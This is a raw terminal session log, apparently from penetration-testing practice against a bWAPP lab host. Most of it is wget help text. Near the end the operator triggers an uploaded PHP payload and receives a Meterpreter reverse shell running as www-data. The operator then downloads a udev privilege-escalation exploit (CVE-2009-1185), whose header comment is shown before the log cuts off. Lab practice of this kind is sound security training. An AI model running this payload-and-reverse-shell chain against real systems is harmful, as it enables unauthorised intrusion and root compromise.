+[7m Manual page wget(1) line 18 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       following example will first reset it, and then set it to exclude [4m/~nobody[24m and [4m/~somebody[24m.  You can also clear the lists in[m
+[7m Manual page wget(1) line 19 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [4m.wgetrc[24m.[m
+[7m Manual page wget(1) line 20 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 21 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K               wget -X " -X /~nobody,/~somebody[m
+[7m Manual page wget(1) line 22 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 23 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       Most options that do not accept arguments are [4mboolean[24m options, so named because their state can be captured with a yes-or-no[m
+[7m Manual page wget(1) line 24 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       ("boolean") variable.  For example, [1m--follow-ftp[0m tells Wget to follow FTP links from HTML files and, on the other hand,[m
+[7m Manual page wget(1) line 25 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m--no-glob[0m tells it not to perform file globbing on FTP URLs.  A boolean option is either [4maffirmative[24m or [4mnegative[24m (beginning[m
+[7m Manual page wget(1) line 26 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       with [1m--no[0m).  All such options share several properties.[m
+[7m Manual page wget(1) line 27 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 28 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       Unless stated otherwise, it is assumed that the default behavior is the opposite of what the option accomplishes.  For[m
+[7m Manual page wget(1) line 29 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       example, the documented existence of [1m--follow-ftp[0m assumes that the default is to [4mnot[24m follow FTP links from HTML pages.[m
+[7m Manual page wget(1) line 30 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 31 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       Affirmative options can be negated by prepending the [1m--no-[0m to the option name; negative options can be negated by omitting[m
+[7m Manual page wget(1) line 32 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       the [1m--no-[0m prefix.  This might seem superfluous---if the default for an affirmative option is to not do something, then why[m
+[7m Manual page wget(1) line 33 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       provide a way to explicitly turn it off?  But the startup file may in fact change the default.  For instance, using[m
+[7m Manual page wget(1) line 34 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       "follow_ftp = on" in [4m.wgetrc[24m makes Wget [4mfollow[24m FTP links by default, and using [1m--no-follow-ftp[0m is the only way to restore[m
+[7m Manual page wget(1) line 35 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       the factory default from the command line.[m
+[7m Manual page wget(1) line 36 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 37 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K   [1mBasic[0m [1mStartup[0m [1mOptions[0m[m
+[7m Manual page wget(1) line 38 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-V[0m[m
+[7m Manual page wget(1) line 39 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m--version[0m[m
+[7m Manual page wget(1) line 40 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Display the version of Wget.[m
+[7m Manual page wget(1) line 41 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 42 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-h[0m[m
+[7m Manual page wget(1) line 43 (press h for help or q to quit)[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ man wget [1P[1P[1P[1P[C[C[C[C[C -h | grep ssg[Kl
+       --ftps-resume-ssl               resume the SSL/TLS session started in the control connection when
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ wget  -h | grep ssl[K[K[K[K[K[K[K[K[K[K| less
+[?1049h[22;0;0t[?1h=GNU Wget 1.20.3, a non-interactive network retriever.
+Usage: wget [OPTION]... [URL]...
+
+Mandatory arguments to long options are mandatory for short options too.
+
+Startup:
+  -V,  --version                   display the version of Wget and exit
+  -h,  --help                      print this help
+  -b,  --background                go to background after startup
+  -e,  --execute=COMMAND           execute a `.wgetrc'-style command
+
+Logging and input file:
+  -o,  --output-file=FILE          log messages to FILE
+  -a,  --append-output=FILE        append messages to FILE
+  -d,  --debug                     print lots of debugging information
+  -q,  --quiet                     quiet (no output)
+  -v,  --verbose                   be verbose (this is the default)
+  -nv, --no-verbose                turn off verboseness, without being quiet
+       --report-speed=TYPE         output bandwidth as TYPE.  TYPE can be bits
+  -i,  --input-file=FILE           download URLs found in local or external FILE
+  -F,  --force-html                treat input file as HTML
+  -B,  --base=URL                  resolves HTML input-file links (-i -F)
+                                     relative to URL
+       --config=FILE               specify config file to use
+       --no-config                 do not read any config file
+       --rejected-log=FILE         log reasons for URL rejection to FILE
+
+Download:
+  -t,  --tries=NUMBER              set number of retries to NUMBER (0 unlimits)
+       --retry-connrefused         retry even if connection is refused
+       --retry-on-http-error=ERRORS    comma-separated list of HTTP errors to retry
+  -O,  --output-document=FILE      write documents to FILE
+  -nc, --no-clobber                skip downloads that would download to
+:[K[K [KESCESC[KOO[KBB[K                                     existing files (overwriting them)
+:[K[K [KESCESC[KOO[KBB[K       --no-netrc                  don't try to obtain credentials from .netrc
+:[K[K [KESCESC[KOO[KBB[K  -c,  --continue                  resume getting a partially-downloaded file
+:[K[K [KESCESC[KOO[KBB[K       --start-pos=OFFSET          start downloading from zero-based position OFFSET
+:[K[K [KESCESC[KOO[KBB[K       --progress=TYPE             select progress gauge type
+:[K[K [KESCESC[KOO[KBB[K       --show-progress             display the progress bar in any verbosity mode
+:[K[K [KESCESC[KOO[KBB[K  -N,  --timestamping              don't re-retrieve files unless newer than
+:[K[K [KESCESC[KOO[KBB[K                                     local
+:[K[K [KESCESC[KOO[KBB[K       --no-if-modified-since      don't use conditional if-modified-since get
+:[K[K [KESCESC[KOO[KBB[K                                     requests in timestamping mode
+:[K[K [KESCESC[KOO[KBB[K       --no-use-server-timestamps  don't set the local file's timestamp by
+:[K[K [KESCESC[KOO[KBB[K                                     the one on the server
+:[K[K [KESCESC[KOO[KBB[K  -S,  --server-response           print server response
+:[K[K [KESCESC[KOO[KBB[K       --spider                    don't download anything
+:[K[K [KESCESC[KOO[KBB[K  -T,  --timeout=SECONDS           set all timeout values to SECONDS
+:[K[K [KESCESC[KOO[KBB[K       --dns-timeout=SECS          set the DNS lookup timeout to SECS
+:[K[K [KESCESC[KOO[KBB[K       --connect-timeout=SECS      set the connect timeout to SECS
+:[K[K [KESCESC[KOO[KBB[K       --read-timeout=SECS         set the read timeout to SECS
+:[K[K [KESCESC[KOO[KBB[K  -w,  --wait=SECONDS              wait SECONDS between retrievals
+:[K[K [KESCESC[KOO[KBB[K       --waitretry=SECONDS         wait 1..SECONDS between retries of a retrieval
+:[K[K [KESCESC[KOO[KBB[K       --random-wait               wait from 0.5*WAIT...1.5*WAIT secs between retrievals
+:[K[K [KESCESC[KOO[KBB[K       --no-proxy                  explicitly turn off proxy
+:[K[K [KESCESC[KOO[KBB[K  -Q,  --quota=NUMBER              set retrieval quota to NUMBER
+:[K[K [KESCESC[KOO[KBB[K       --bind-address=ADDRESS      bind to ADDRESS (hostname or IP) on local host
+:[K[K [KESCESC[KOO[KBB[K       --limit-rate=RATE           limit download rate to RATE
+:[K[K [KESCESC[KOO[KBB[K       --no-dns-cache              disable caching DNS lookups
+:[K[K [KESCESC[KOO[KBB[K       --restrict-file-names=OS    restrict chars in file names to ones OS allows
+:[K[K [KESCESC[KOO[KBB[K       --ignore-case               ignore case when matching files/directories
+:[K[K [KESCESC[KOO[KBB[K  -4,  --inet4-only                connect only to IPv4 addresses
+:[K[K [KESCESC[KOO[KBB[K  -6,  --inet6-only                connect only to IPv6 addresses
+:[K[K [KESCESC[KOO[KBB[K       --prefer-family=FAMILY      connect first to addresses of specified family,
+:[K[K [KESCESC[KOO[KBB[K                                     one of IPv6, IPv4, or none
+:[K[K [KESCESC[KOO[KBB[K       --user=USER                 set both ftp and http user to USER
+:[K[K [KESCESC[KOO[KBB[K       --password=PASS             set both ftp and http password to PASS
+:[K[K [KESCESC[KOO[KBB[K       --ask-password              prompt for passwords
+:[K[K [KESCESC[KOO[KBB[K       --use-askpass=COMMAND       specify credential handler for requesting 
+:[K[K [KESCESC[KOO[KBB[K                                     username and password.  If no COMMAND is 
+:[K[K [KESCESC[KOO[KBB[K                                     specified the WGET_ASKPASS or the SSH_ASKPASS 
+:[K[K [KESCESC[KOO[KBB[K                                     environment variable is used.
+:[K[K [KESCESC[KOO[KBB[K       --no-iri                    turn off IRI support
+:[K[K [KESCESC[KOO[KBB[K       --local-encoding=ENC        use ENC as the local encoding for IRIs
+:[K[K [KESCESC[KOO[KBB[K       --remote-encoding=ENC       use ENC as the default remote encoding
+:[K[K [KESCESC[KOO[KBB[K       --unlink                    remove file before clobber
+:[K[K [KESCESC[KOO[KBB[K       --xattr                     turn on storage of metadata in extended file attributes
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[KDirectories:
+:[K[K [KESCESC[KOO[KBB[K  -nd, --no-directories            don't create directories
+:[K[K [KESCESC[KOO[KBB[K  -x,  --force-directories         force creation of directories
+:[K[K [KESCESC[KOO[KBB[K  -nH, --no-host-directories       don't create host directories
+:[K[K [KESCESC[KOO[KBB[K       --protocol-directories      use protocol name in directories
+:[K[K [KESCESC[KOO[KBB[K  -P,  --directory-prefix=PREFIX   save files to PREFIX/..
+:[K[K [KESCESC[KOO[KBB[K       --cut-dirs=NUMBER           ignore NUMBER remote directory components
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[KHTTP options:
+:[K[K [KESCESC[KOO[KBB[K       --http-user=USER            set http user to USER
+:[K[K [KESCESC[KOO[KBB[K       --http-password=PASS        set http password to PASS
+:[K[K [KESCESC[KOO[KBB[K       --no-cache                  disallow server-cached data
+:[K[K [KESCESC[KOO[KBB[K       --default-page=NAME         change the default page name (normally
+:[K[K [KESCESC[KOO[KBB[K                                     this is 'index.html'.)
+:[K[K [KESCESC[KOO[KBB[K  -E,  --adjust-extension          save HTML/CSS documents with proper extensions
+:[K[K [KESCESC[KOO[KBB[K       --ignore-length             ignore 'Content-Length' header field
+:[K[K [KESCESC[KOO[KBB[K       --header=STRING             insert STRING among the headers
+:[K[K [KESCESC[KOO[KBB[K       --compression=TYPE          choose compression, one of auto, gzip and none. (default: none)
+:[K[K [KESCESC[KOO[KBB[K       --max-redirect              maximum redirections allowed per page
+:[K[K [KESCESC[KOO[KBB[K       --proxy-user=USER           set USER as proxy username
+:[K[K [KESCESC[KOO[KBB[K       --proxy-password=PASS       set PASS as proxy password
+:[K[K [KESCESC[KOO[KBB[K       --referer=URL               include 'Referer: URL' header in HTTP request
+:[K[K [KESCESC[KOO[KBB[K       --save-headers              save the HTTP headers to file
+:[K[K [KESCESC[KOO[KBB[K  -U,  --user-agent=AGENT          identify as AGENT instead of Wget/VERSION
+:[K[K [KESCESC[KOO[KBB[K       --no-http-keep-alive        disable HTTP keep-alive (persistent connections)
+:[K[K [KESCESC[KOO[KBB[K       --no-cookies                don't use cookies
+:[K[K [KESCESC[KOO[KBB[K       --load-cookies=FILE         load cookies from FILE before session
+:[K[K [KESCESC[KOO[KBB[K       --save-cookies=FILE         save cookies to FILE after session
+:[K[K [KESCESC[KOO[KBB[K       --keep-session-cookies      load and save session (non-permanent) cookies
+:[K[K [KESCESC[KOO[KBB[K       --post-data=STRING          use the POST method; send STRING as the data
+:[K[K [KESCESC[KOO[KBB[K       --post-file=FILE            use the POST method; send contents of FILE
+:[K[K [KESCESC[KOO[KBB[K       --method=HTTPMethod         use method "HTTPMethod" in the request
+:[K[K [KESCESC[KOO[KBB[K       --body-data=STRING          send STRING as data. --method MUST be set
+:[K[K [KESCESC[KOO[KBB[K       --body-file=FILE            send contents of FILE. --method MUST be set
+:[K[K [KESCESC[KOO[KBB[K       --content-disposition       honor the Content-Disposition header when
+:[K[K [KESCESC[KOO[KBB[K                                     choosing local file names (EXPERIMENTAL)
+:[K[K [KESCESC[KOO[KBB[K       --content-on-error          output the received content on server errors
+:[K[K [KESCESC[KOO[KBB[K       --auth-no-challenge         send Basic HTTP authentication information
+:[K[K [KESCESC[KOO[KBB[K                                     without first waiting for the server's
+:[K[K [KESCESC[KOO[KBB[K                                     challenge
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[KHTTPS (SSL/TLS) options:
+:[K[K [KESCESC[KOO[KBB[K       --secure-protocol=PR        choose secure protocol, one of auto, SSLv2,
+:[K[K [KESCESC[KOO[KBB[K                                     SSLv3, TLSv1, TLSv1_1, TLSv1_2 and PFS
+:[K[K [KESCESC[KOO[KBB[K       --https-only                only follow secure HTTPS links
+:[K[K [KESCESC[KOO[KBB[K       --no-check-certificate      don't validate the server's certificate
+:[K[K [KESCESC[KOO[KBB[K       --certificate=FILE          client certificate file
+:[K[K [KESCESC[KOO[KBB[K       --certificate-type=TYPE     client certificate type, PEM or DER
+:[K[K [KESCESC[KOO[KBB[K       --private-key=FILE          private key file
+:[K[K [KESCESC[KOO[KBB[K       --private-key-type=TYPE     private key type, PEM or DER
+:[K[K [KESCESC[KOO[KBB[K       --ca-certificate=FILE       file with the bundle of CAs
+:[K[K [KESCESC[KOO[KBB[K       --ca-directory=DIR          directory where hash list of CAs is stored
+:[K[K [KESCESC[KOO[KBB[K       --crl-file=FILE             file with bundle of CRLs
+:[K[K [KESCESC[KOO[KBB[K       --pinnedpubkey=FILE/HASHES  Public key (PEM/DER) file, or any number
+:[K[K [KESCESC[KOO[KBB[K                                   of base64 encoded sha256 hashes preceded by
+:[K[K [KESCESC[KOO[KBB[K                                   'sha256//' and separated by ';', to verify
+:[K[K [KESCESC[KOO[KBB[K                                   peer against
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K       --ciphers=STR           Set the priority string (GnuTLS) or cipher list string (OpenSSL) directly.
+:[K[K [KESCESC[KOO[KBB[K                                   Use with care. This option overrides --secure-protocol.
+:[K[K [KESCESC[KOO[KBB[K                                   The format and syntax of this string depend on the specific SSL/TLS engine.
+:[K[K [KESCESC[KOO[KBB[KHSTS options:
+:[K[K [KESCESC[KOO[KBB[K       --no-hsts                   disable HSTS
+:[K[K [KESCESC[KOO[KBB[K       --hsts-file                 path of HSTS database (will override default)
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ wget  -h | lessgrep ssl[10Pman wget fg[Kcat wget-log ll[Kwget https://10.10.10.6/webdav/rt_payload_1.php & ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ ll
+total 116
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:50 01.session
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 17 17:51 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:51 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6943 Aug 17 17:51 01.session.script
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 19:04 rt_payload_1.php
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 18 19:09 terminal-log_Tue_18_Aug_2020_07:02:48_PM_IST.dmp
+-rw-r--r-- 1 dinesh dinesh   391 Aug 18 19:08 wget-log
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ em [K[K[Krm wget-log 
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ ll
+total 112
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:50 01.session
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 17 17:51 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:51 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6943 Aug 17 17:51 01.session.script
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 19:04 rt_payload_1.php
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 18 19:09 terminal-log_Tue_18_Aug_2020_07:02:48_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ wllrm wget-log ll[Kwget  -h | lessgrep ssl[10Pman wget fg[Kcat wget-log ll[Kwget https://10.10.10.6/webdav/rt_payload_1.php &  [K[K[K[C[C[C[C[C[1@ [22@--no-check-certificate[C[1@ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C &[K]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ wget --no-check-certificate  https://10.10.10.6/webdav/rt_payload_1.php  &[K[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ wget --no-check-certificate  https://10.10.10.6/webdav/rt_payload_1.php  &[K[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ wget --no-check-certificate  https://10.10.10.6/webdav/rt_payload_1.php  &[K]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ wget --no-check-certificate  https://10.10.10.6/webdav/rt_payload_1.php  &[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ wget --no-check-certificate  https://10.10.10.6/webdav/rt_payload_1.php  &
+[2] 17725
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ 
+Redirecting output to ‘wget-log’.
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ cat wget-log 
+--2020-08-18 19:10:35--  https://10.10.10.6/webdav/rt_payload_1.php
+Connecting to 10.10.10.6:443... connected.
+WARNING: The certificate of ‘10.10.10.6’ is not trusted.
+WARNING: The certificate of ‘10.10.10.6’ doesn't have a known issuer.
+WARNING: The certificate of ‘10.10.10.6’ has expired.
+The certificate has expired
+The certificate's owner does not match hostname ‘10.10.10.6’
+HTTP request sent, awaiting response... ]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ fg[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ fg
+msfconsole -q
+[1m[34m[*][0m Sending stage (38288 bytes) to 10.10.10.6
+[1m[34m[*][0m Meterpreter session 1 opened (10.10.10.10:4444 -> 10.10.10.6:48570) at 2020-08-18 19:10:45 +0530
+[0m
+[0m[4mmeterpreter[0m > shell 
+[0mProcess 16856 created.
+Channel 0 created.
+whoami
+www-data
+^C
+Terminate channel 0? [y/N]  y
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > sessions 
+[0mUsage: sessions <id>
+
+Interact with a different session Id.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+
+[4mmeterpreter[0m > bg
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                   Information              Connection
+  --  ----  ----                   -----------              ----------
+  1         meterpreter php/linux  www-data (33) @ bee-box  10.10.10.10:4444 -> 10.10.10.6:48570 (10.10.10.6)
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[1]+  Stopped                 msfconsole -q
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ ll
+total 128
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:50 01.session
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 17 17:51 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:51 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6943 Aug 17 17:51 01.session.script
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 19:04 rt_payload_1.php
+-rw-r--r-- 1 dinesh dinesh 57344 Aug 18 19:11 terminal-log_Tue_18_Aug_2020_07:02:48_PM_IST.dmp
+-rw-r--r-- 1 dinesh dinesh   437 Aug 18 19:10 wget-log
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ tai[K[K[Kless wget-log 
+[?1049h[22;0;0t[?1h=--2020-08-18 19:10:35--  https://10.10.10.6/webdav/rt_payload_1.php
+Connecting to 10.10.10.6:443... connected.
+WARNING: The certificate of ‘10.10.10.6’ is not trusted.
+WARNING: The certificate of ‘10.10.10.6’ doesn't have a known issuer.
+WARNING: The certificate of ‘10.10.10.6’ has expired.
+The certificate has expired
+The certificate's owner does not match hostname ‘10.10.10.6’
+HTTP request sent, awaiting response... 
+[7mwget-log (END)[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ wget https://10.10.10.6/evil/cve-2009-1185.cless wget-log [Kl[Kfgcat wget-log wget --no-check-certificate  https://10.10.10.6/webdav/rt_payload_1.php  &[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K https://10.10.10.6/evil/cve-2009-1185.c
+--2020-08-18 19:11:52--  https://10.10.10.6/evil/cve-2009-1185.c
+Connecting to 10.10.10.6:443... connected.
+WARNING: The certificate of ‘10.10.10.6’ is not trusted.
+WARNING: The certificate of ‘10.10.10.6’ doesn't have a known issuer.
+WARNING: The certificate of ‘10.10.10.6’ has expired.
+The certificate has expired
+The certificate's owner does not match hostname ‘10.10.10.6’
+HTTP request sent, awaiting response... 200 OK
+Length: 2878 (2.8K) [text/x-csrc]
+Saving to: ‘cve-2009-1185.c’
+
+cve-2009-1185.c                     0%[                                                             ]       0  --.-KB/s               cve-2009-1185.c                   100%[============================================================>]   2.81K  --.-KB/s    in 0s      
+
+2020-08-18 19:11:52 (24.0 MB/s) - ‘cve-2009-1185.c’ saved [2878/2878]
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ ll
+total 136
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:50 01.session
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 17 17:51 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:51 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6943 Aug 17 17:51 01.session.script
+-rw-r--r-- 1 dinesh dinesh  2878 Nov  3  2014 cve-2009-1185.c
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 19:04 rt_payload_1.php
+-rw-r--r-- 1 dinesh dinesh 61440 Aug 18 19:11 terminal-log_Tue_18_Aug_2020_07:02:48_PM_IST.dmp
+-rw-r--r-- 1 dinesh dinesh   437 Aug 18 19:10 wget-log
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ less cve-2009-1185.c 
+[?1049h[22;0;0t[?1h=/*
+ * cve-2009-1185.c
+ *
+ * udev < 141 Local Privilege Escalation Exploit
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ *
+ * Information:
+ *
+ *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185
+ *
+ *   udev before 1.4.1 does not verify whether a NETLINK message originates 
+ *   from kernel space, which allows local users to gain privileges by sending 
+ *   a NETLINK message from user space.
+ *
+ * Notes:
+ *   
+ *   An alternate version of kcope's exploit.  This exploit leverages the 
